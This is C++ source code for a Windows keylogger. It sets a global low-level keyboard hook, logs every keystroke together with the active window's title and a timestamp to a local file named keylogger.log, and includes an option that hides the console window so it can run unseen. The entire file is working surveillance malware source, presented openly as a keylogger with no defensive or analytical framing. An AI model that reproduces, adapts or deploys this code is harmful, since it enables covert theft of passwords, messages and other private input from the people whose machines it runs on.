#define UNICODE
#include <Windows.h>
#include <cstring>
#include <fstream>
#include <iostream>
#include <sstream> 
#include <time.h> 
#include <map> 

using namespace std; 


// ───────────────────────────────────────────────────────────────
// SECTION: Compile-Time Configuration
// ───────────────────────────────────────────────────────────────


//show or hide console window 
#define Visible // or use 'invisible'

// Wait during boot (if you want the program to delay when run at boot)
#define bootwait //or use 'nowait'

//Format for logging keycodes: 0=readable, 10=decimal, 16=hex
#define FORMAT 0 // 0=readable, 10=decimal, 16=hex

//Ignore mouse click events
#define mouseignore 


// ───────────────────────────────────────────────────────────────
// SECTION: Global Variables and Constants
// ───────────────────────────────────────────────────────────────


//Virtual key mappings for readable output
#if FORMAT == 0
const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

//Handle to keyboard hook
HHOOK _hook; 

// Struct for low-level keyboard input
KBDLLHOOKSTRUCT kbdStruct;

// Log file stream
std::ofstream output_file;


// ───────────────────────────────────────────────────────────────
// SECTION: Function Declarations
// ───────────────────────────────────────────────────────────────


// Declaration of HookCallBack function (Defined later in Program) 
LRESULT __stdcall HookCallBack(int ncode , WPARAM wParam , LPARAM lParam);

//Declaration of Save function (Defined Later in Program)
int Save(int Key_strokes);


// ───────────────────────────────────────────────────────────────
// SECTION: Utility Functions
// ───────────────────────────────────────────────────────────────


//Show or hide console window based on visibility setting
void Stealth(){
	#ifdef Visible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL),1); //visible
	#endif
	#ifdef Invisible
		ShowWindow(FindWindowA("ConsoleWindowClass", NULL),0); //hidden
		FreeConsole();
	#endif 
}

//Wait until system has been up for at least 60 seconds
bool isSystemBooting(){
	return GetTickCount() < 60000;
}


// ───────────────────────────────────────────────────────────────
// SECTION: Keyboard Hook Setup and Teardown
// ───────────────────────────────────────────────────────────────


//Set up the global keyboard hook
void SetHook()
{
	_hook = SetWindowsHookEx(WH_KEYBOARD_LL , HookCallBack , NULL , 0);
	if(!_hook)
	{
		MessageBox(NULL , L"Failed to install hook!" , L"Error" , MB_ICONERROR);
	}
}

//Remove the keyboard hook
void ReleaseHook(){
	UnhookWindowsHookEx(_hook);
}


// ───────────────────────────────────────────────────────────────
// SECTION: Logging Function
// ───────────────────────────────────────────────────────────────


//Actual Defination of Save function. 
int Save(int key_strokes){

	std::stringstream output;
	static char lastwindow[256] = "";

	#ifndef mouseignore
		if (key_strokes == 1 || key_strokes == 1)
		return 0;
	#endif

	//Get current foreground window and its keybord layout  
	HWND foreground = GetForegroundWindow();
	DWORD threadID; 
	HKL layout = NULL; 

	if(foreground){
		threadID = GetWindowThreadProcessId(foreground , NULL);
		layout = GetKeyboardLayout(threadID);
	}

	// log window title if it is changed.
	if(foreground){
		char window_title[256];
		GetWindowTextA(foreground , window_title , sizeof(window_title));

		if(strcmp(window_title , lastwindow) != 0){
			strcpy(lastwindow, window_title);

			// Get and format time
			time_t t = time(NULL);
			struct tm* tm_ptr = localtime(&t);
			char time_str[64];
			strftime(time_str, sizeof(time_str), "%FT%X%z", tm_ptr);

			output << "\n\n[Window: " << window_title << " - at " << time_str << "] ";
		}
	}


	// format key output
	#if FORMAT == 10
		output << '[' << key_strokes << ']' ;
	#elif FORMAT == 16 
		output << std::hex << '[' << key_strokes << ']';
	#else
		if (keyname.find(key_strokes) != keyname.end())
		{
			output << keyname.at(key_strokes);
		}
		else
		{
			char key;
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			if ((GetKeyState(VK_SHIFT) & 0x1000) || (GetKeyState(VK_LSHIFT) & 0x1000) || (GetKeyState(VK_RSHIFT) & 0x1000))
			{
				lowercase = !lowercase;
			}

			key = MapVirtualKeyExA(key_strokes, MAPVK_VK_TO_CHAR, layout);
			if (!lowercase)
				key = tolower(key);

			output << char(key);
		}
	#endif	 

	output_file << output.str();
	output_file.flush();
	std::cout << output.str();
	return 0;
}


// ───────────────────────────────────────────────────────────────
// SECTION: Keyboard Hook Callback
// ───────────────────────────────────────────────────────────────


//Triggered every time a key is pressed
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 && wParam == WM_KEYDOWN)
	{
		kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
		Save(kbdStruct.vkCode);
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);

}


// ───────────────────────────────────────────────────────────────
// SECTION: Main Function
// ───────────────────────────────────────────────────────────────


int main()
{

	Stealth(); // Show or hide window

	#ifdef bootwait
		while (isSystemBooting())
		{
			std::cout << "System is still booting up. Waiting 10 seconds...\n";
			Sleep(10000);
		}
	#endif

	#ifdef nowait
		std::cout << "Skipping boot check.\n";
	#endif


	const char* output_filename = "keylogger.log";
	std::cout << "Logging output to " << output_filename << std::endl;
	output_file.open(output_filename, std::ios_base::app);

	// Set up the keyboard hook
	SetHook();

	// Keep the application running
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}

	// Clean up 
	ReleaseHook();
	output_file.close();

	return 0;

}